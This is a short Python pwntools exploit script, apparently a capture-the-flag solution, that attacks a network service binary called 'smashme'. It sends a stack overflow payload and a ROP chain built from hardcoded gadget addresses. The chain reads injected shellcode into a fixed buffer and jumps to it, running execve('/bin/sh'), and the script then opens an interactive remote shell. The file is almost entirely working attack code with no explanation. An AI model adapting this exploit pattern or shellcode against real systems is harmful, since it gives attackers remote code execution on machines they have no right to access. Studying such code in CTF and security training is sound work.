#!/usr/bin/env python
import sys, os
from pwn import *
from struct import pack

HOST, PORT = (sys.argv[1], sys.argv[2]) if len(sys.argv) > 2 else ('localhost', 5566)
elf = ELF('smashme'); context.word_size = elf.elfclass
with context.local(log_level='ERROR'):
    libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc
if not libc: log.warning('Cannot open libc.so.6')

r = remote(HOST, PORT)

raw_input('wait for gdb...')
exp = 'Smash me outside, how bout dAAAAAAAAAAA'
exp += cyclic(33)
pop_rdi = 0x4014d6
pop_rsi = 0x4015f7
pop_rdx = 0x441e46
pop_rax = 0x4c3b28
buf =     0x6cc800
syscall = 0x466815
sc = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

exp += flat(pop_rdi, 0, pop_rsi, buf, pop_rdx, len(sc), pop_rax, 0, syscall, buf) # write /bin/sh to buf

r.sendline(exp)
r.send(sc)

r.interactive()
